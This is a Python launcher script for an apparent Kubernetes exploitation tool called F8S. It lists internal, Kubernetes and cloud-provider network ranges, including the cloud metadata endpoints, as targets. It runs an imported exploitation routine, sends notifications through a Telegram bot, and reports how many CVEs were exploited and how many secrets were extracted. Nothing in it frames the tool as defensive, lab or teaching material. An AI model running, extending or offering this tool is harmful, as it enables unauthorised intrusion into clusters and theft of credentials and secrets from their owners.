#!/usr/bin/env python3
import asyncio
import json
from f8s_exploit_pod import run_f8s_exploitation

async def optimized_f8s_launch():
    """Optimized F8S launch with best CIDR ranges for maximum coverage"""
    
    # Best CIDR ranges for K8s cluster discovery
    target_ranges = [
        # Common internal K8s networks
        "10.0.0.0/16",      # Most common internal range
        "172.16.0.0/12",    # Docker default bridge networks
        "192.168.0.0/16",   # Private class C networks
        "10.96.0.0/12",     # Default K8s service CIDR
        "10.244.0.0/16",    # Common pod network CIDR
        
        # Cloud provider specific ranges
        "10.240.0.0/16",    # GKE nodes
        "172.20.0.0/16",    # EKS nodes
        "10.1.0.0/16",      # AKS nodes
        "172.31.0.0/16",    # AWS VPC default
        
        # Corporate/Enterprise ranges
        "10.10.0.0/16",     # Common corp networks
        "172.30.0.0/16",    # Enterprise DMZ
        "192.168.100.0/24", # Management networks
        
        # Cloud metadata ranges
        "169.254.169.254/32", # AWS/GCP metadata
        "169.254.170.2/32",   # Azure metadata
    ]
    
    print("🎯 Launching F8S Pod Exploitation with optimized CIDR ranges...")
    print(f"📡 Scanning {len(target_ranges)} network ranges")
    
    # Set your Telegram token for notifications
    telegram_token = "YOUR_BOT_TOKEN_HERE"  # Replace with actual token
    
    # Launch exploitation
    results = await run_f8s_exploitation(
        target_ranges=target_ranges,
        telegram_token=telegram_token
    )
    
    # Save results to file
    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    output_file = f"f8s_results_{timestamp}.json"
    
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"✅ Results saved to: {output_file}")
    print(f"🔥 CVEs Exploited: {results['exploitation_summary']['cves_exploited']}")
    print(f"🎯 Clusters Found: {results['exploitation_summary']['clusters_scanned']}")
    print(f"🔐 Secrets Extracted: {results['exploitation_summary']['secrets_extracted']}")
    
    return results

if __name__ == "__main__":
    import datetime
    asyncio.run(optimized_f8s_launch())